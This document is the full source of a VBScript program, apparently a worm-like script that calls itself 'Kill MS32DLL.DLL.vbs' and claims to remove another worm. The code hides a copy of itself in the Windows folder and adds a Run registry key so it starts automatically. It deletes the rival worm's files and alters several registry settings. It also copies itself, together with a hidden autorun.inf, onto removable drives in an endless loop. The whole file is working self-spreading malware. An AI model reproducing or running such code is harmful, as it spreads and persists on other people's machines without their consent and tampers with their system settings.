'My name is slow but sure v 1.00 (Kill MS32DLL.DLL.vbs)
On Error Resume Next
Dim a,b,c,d,e,f,mf,r,t,I,J,K
Set a=CreateObject("scripting.filesystemobject")
Set b=CreateObject("Wscript.shell")
set mf = a.getfile(Wscript.ScriptFullname)
Set f=a.GetSpecialFolder(0)
dim text,size
size = mf.size
check = mf.drive.DriveType
set I=mf.OpenAsTextStream(1,-2)
do while not I.atendofstream
J=J & I.readline
J=J & vbcrlf
Loop
Set c=a.Drives
Do
If Not a.FileExists(f & "\killgodzilla.vbs") then
set K=a.createtextfile(f & "\killgodzilla.vbs",2,true)
K.write J
K.close
set K = a.getfile(f & "\killgodzilla.vbs")
K.attributes = -1
End If
       b.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\KILLMS32DLL",f& "\killgodzilla.vbs"
For Each d In c
If d.DriveType=1 Or d.DriveType=2 Then
  If d.Path<> "A:" Then
      b.Regdelete "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MS32DLL"
      b.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title",""
      b.regwrite "HKCR\vbsfile\DefaultIcon","%SystemRoot%\System32\WScript.exe,2"
    If a.FileExists(f & "\MS32DLL.dll.vbs") Then
    Set e=a.DeleteFile(f & "\MS32DLL.dll.vbs")
    End If
   If a.FileExists(d.Path & "\MS32DLL.dll.vbs") Then
   Set e=a.DeleteFile(d.Path & "\MS32DLL.dll.vbs")
    End If
    If d.DriveType=1 Then
     If d.Path<>"A:" Then
       If Not a.FileExists(d.Path & "\killgodzilla.vbs") then
       Set K=a.CreateTextFile(d.Path & "\killgodzilla.vbs",2,True)
       K.Write J
       K.Close
       Set K=a.CreateTextFile(d.Path & "\autorun.inf",2,True)
       K.writeline "[autorun]"
       K.WriteLine "shellexecute=wscript.exe killgodzilla.vbs"
       K.Close
       Set K=a.GetFile(d.Path & "\killgodzilla.vbs")
       K.Attributes = -1
       Set K=a.GetFile(d.Path & "\autorun.inf")
       K.Attributes = -1
       End if
       End If
       End if
  End if  
  End If
  Next
  if check <> 1 then
Wscript.sleep 2000
end if
loop while check<>1

